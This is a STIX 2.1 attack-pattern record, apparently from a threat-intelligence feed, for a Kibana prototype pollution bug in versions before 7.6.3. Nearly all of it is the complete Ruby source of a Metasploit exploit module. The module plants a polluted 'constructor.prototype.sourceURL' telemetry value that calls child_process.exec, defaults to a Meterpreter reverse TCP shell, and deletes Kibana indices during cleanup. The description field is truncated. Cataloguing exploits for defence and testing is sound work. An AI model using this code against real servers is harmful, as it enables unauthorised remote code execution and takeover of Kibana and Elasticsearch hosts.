{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d373a839-d799-45c9-a9fb-f43c17e641e3",
    "created": "2024-08-14T17:01:38.267049Z",
    "modified": "2024-08-14T17:01:38.267053Z",
    "name": "Kibana Upgrade Assistant Telemetry Collector Prototype Pollution",
    "description": " Kibana before version 7.6.3 suffers from a prototype pollution bug within the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/kibana_upgrade_assistant_telemetry_rce.rb",
            "external_id": "kibana_upgrade_assistant_telemetry_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/852613"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # causes service to not respond until cleanup and reboot\n  include Msf::Exploit::Remote::HttpClient\n  # decided not to use autocheck since it doesn't work for both targets\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Kibana Upgrade Assistant Telemetry Collector Prototype Pollution',\n        'Description' => %q{\n          Kibana before version 7.6.3 suffers from a prototype pollution bug within the\n          Upgrade Assistant. By setting a new constructor.prototype.sourceURL value we're\n          able to execute arbitrary code.\n          Code execution is possible through two different ways. Either by sending data\n          directly to Elastic, or using Kibana to submit the same queries. Either method\n          enters the polluted prototype for Kibana to read.\n\n          Kibana will either need to be restarted, or collection happens (unknown time) for\n          the payload to execute. Once it does, cleanup must delete the .kibana_1 index\n          for Kibana to restart successfully. Once a callback does occur, cleanup will\n          happen allowing Kibana to be successfully restarted on next attempt.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Alex Brasetvik (alexbrasetvik)' # original PoC, analysis\n        ],\n        'References' => [\n          [ 'URL', 'https://hackerone.com/reports/852613'],\n        ],\n        'Privileged' => false,\n        'Arch' => [ ARCH_CMD ],\n        'Platform' => [ 'linux' ],\n        'Type' => :nix_cmd,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/linux/http/x64/meterpreter/reverse_tcp',\n          'WfsDelay' => 1800 # 30min\n        },\n        'Targets' => [\n          [ 'ELASTIC', {}], # target kibana through a direct elastic connection\n          [ 'KIBANA', {}] # target kibana through the dev console to implant elastic data\n        ],\n        'DisclosureDate' => '2020-04-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SERVICE_DOWN], # down until cleanup and reboot\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(9200), # default to elastic port, kibana is 5601\n        OptString.new('USERNAME', [ false, 'Elastic User to login with', '']),\n        OptString.new('PASSWORD', [ false, 'Elastic Password to login with', '']),\n        OptString.new('TARGETURI', [ true, 'The URI of the Kibana/Elastic Application', '/'])\n      ]\n    )\n  end\n\n  # https://stackoverflow.com/a/4899857\n  def time_rand(from = Time.local(2020, 6, 28), to = Time.now)\n    Time.at(from + rand * (to.to_f - from.to_f)).strftime('%FT%T.000Z')\n    # outputs 2020-04-17T20:47:40.800Z format\n  end\n\n  # This is how it should be done, but it will crash the session. Leaving here in case someone figures out how to not crash the session\n  # it may also only crash when on docker, and may be fine elsewehre. Regardless, good code to not lose just in case.\n  def kibana_cleanup\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'console', 'proxy'),\n      'method' => 'POST',\n      'headers' => {\n        'kbn-xsrf' => @xsrf\n      },\n      'ctype' => 'application/json',\n      'vars_get' => {\n        'path' => '.kibana_1', # URI for the elastic request\n        'method' => 'DELETE' # method for the elastic query\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def elastic_cleanup\n    request = {\n      'uri' => normalize_uri(target_uri.path, '.kibana*'),\n      'method' => 'DELETE'\n\n    }\n    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present?\n\n    res = send_request_cgi(request)\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def execute_command\n    case target.name\n    when 'ELASTIC'\n      request = {\n        'uri' => normalize_uri(target_uri.path, '.kibana_1', '_doc', 'upgrade-assistant-telemetry:upgrade-assistant-telemetry'),\n        'method' => 'PUT',\n        'ctype' => 'application/json',\n        'data' => telemetry_data.to_json\n      }\n      request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present?\n\n      res = send_request_cgi(request)\n    when 'KIBANA'\n      res = send_request_cgi(\n        'uri' => normalize_uri(target_uri.path, 'api', 'console', 'proxy'),\n        'method' => 'POST',\n        'headers' => {\n          'kbn-xsrf' => @xsrf\n        },\n        'ctype' => 'application/json',\n        'vars_get' => {\n          'path' => '.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry', # URI for the elastic request\n          'method' => 'PUT' # method for the elastic query\n        },\n        'data' => telemetry_data.to_json\n      )\n    end\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 201\n  end\n\n  def telemetry_data\n    {\n      'upgrade-assistant-telemetry' => {\n        'ui_open.overview' => 1,\n        'ui_open.cluster' => 1,\n        'ui_open.indices' => 1,\n        'constructor.prototype.sourceURL' => \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('#{payload.encoded}')\"\n      },\n      'type' => 'upgrade-assistant-telemetry',\n      'updated_at' => time_rand\n    }\n  end\n\n  def kibana_create_index\n    # if the index already exists, this will fail which is fine, we just need it to exist.\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'console', 'proxy'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'headers' => {\n        'kbn-xsrf' => @xsrf\n      },\n      'vars_get' => {\n        'path' => '.kibana_1', # URI for the elastic request\n        'method' => 'PUT' # method for the elastic query\n      }\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    if res.code == 400\n      vprint_status('Index already exists')\n      return\n    end\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def elastic_create_index\n    request = {\n      'uri' => normalize_uri(target_uri.path, '.kibana_1'),\n      'method' => 'PUT'\n    }\n    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present?\n\n    res = send_request_cgi(request)\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    if res.code == 400\n      vprint_status('Index already exists')\n      return\n    end\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def kibana_send_mapping\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'api', 'console', 'proxy'),\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'headers' => {\n        'kbn-xsrf' => @xsrf\n      },\n      'vars_get' => {\n        'path' => '.kibana_1/_mappings', # URI for the elastic request\n        'method' => 'PUT' # method for the elastic query\n      },\n      'data' => mapping_data.to_json\n    )\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def elastic_send_mapping\n    request = {\n      'uri' => normalize_uri(target_uri.path, '.kibana_1', '_mappings'),\n      'method' => 'PUT',\n      'ctype' => 'application/json',\n      'data' => mapping_data.to_json\n\n    }\n    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present?\n\n    res = send_request_cgi(request)\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid response (response code: #{res.code})\") unless res.code == 200\n  end\n\n  def mapping_data\n    {\n      'properties' => {\n        'upgrade-assistant-telemetry' => {\n          'properties' => {\n            'constructor' => {\n              'properties' => {\n                'prototype' => {\n                  'properties' => {\n                    'sourceURL' => {\n                      'type' => 'text',\n                      'fields' => {\n                        'keyword' => {\n                          'type' => 'keyword',\n                          'ignore_above' => 256\n                        }\n                      }\n                    }\n                  }\n                }\n              }\n            },\n            'features' => {\n              'properties' => {\n                'deprecation_logging' => {\n                  'properties' => {\n                    'enabled' => {\n                      'type' => 'boolean',\n                      'null_value' => true\n                    }\n                  }\n                }\n              }\n            },\n            'ui_open' => {\n              'properties' => {\n                'cluster' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                },\n                'indices' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                },\n                'overview' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                }\n              }\n            },\n            'ui_reindex' => {\n              'properties' => {\n                'close' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                },\n                'open' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                },\n                'start' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                },\n                'stop' => {\n                  'type' => 'long',\n                  'null_value' => 0\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  end\n\n  def check\n    if target == targets[0] # elastic\n      return CheckCode::Unknown('Unable to determine Kibana version from Elastic database')\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'app', 'kibana'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n    return CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    # this pulls a big JSON blob that we need as it has the version\n    unless %r{<kbn-injected-metadata data=\"([^\"]+)\"></kbn-injected-metadata>} =~ res.body\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\")\n    end\n\n    version_json = CGI.unescapeHTML(Regexp.last_match(1))\n\n    begin\n      json_body = JSON.parse(version_json)\n    rescue JSON::ParserError\n      return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\")\n    end\n\n    return Exploit::CheckCode::Safe(\"#{peer} - Unexpected response, unable to determine version\") if json_body['version'].nil?\n\n    @version = json_body['version']\n\n    if Rex::Version.new(@version) < Rex::Version.new('7.6.3')\n      return CheckCode::Appears(\"Exploitable Version Detected: #{@version}\")\n    end\n\n    CheckCode::Safe(\"Unexploitable Version Detected: #{@version}\")\n  end\n\n  def exploit\n    @clean = true\n    fail_with(Failure::BadConfig, 'A password has been defined without a username') if datastore['USERNAME'].blank? && !datastore['PASSWORD'].blank?\n    case target.name\n    when 'ELASTIC'\n      print_warning('RPORT should most likely be set to 9200 when exploiting the ELASTIC target') if datastore['RPORT'] != 9200\n      print_status('Creating index')\n      elastic_create_index\n      print_status('Sending index map')\n      elastic_send_mapping\n    when 'KIBANA'\n      print_warning('RPORT should most likely be set to 5601 when exploiting the KIBANA target') if datastore['RPORT'] != 5601\n      # xsrf for unlicensed kibana seems to just be kibana... at least for 7.6.2\n      # https://discuss.elastic.co/t/where-can-i-get-the-correct-kbn-xsrf-value-for-my-plugin-http-requests/158725/3\n      @xsrf = 'kibana'\n      print_status('Creating index')\n      kibana_create_index\n      print_status('Sending index map')\n      kibana_send_mapping\n    end\n    print_status('Sending telemetry data with payload')\n    execute_command\n    print_status(\"Waiting #{datastore['WfsDelay']} seconds for shell (kibana restart/cleanup)\")\n  end\n\n  def cleanup\n    return unless @clean\n\n    if target.name == 'KIBANA'\n      print_error('Cleanup must happen on the Elastic Database for Kibana to start. You need to DELETE /.kibana_1')\n      # kibana_cleanup\n      return\n    end\n    print_status('Removing telemetry data to prevent Kibana locking on restart')\n    elastic_cleanup\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2020-04-17",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}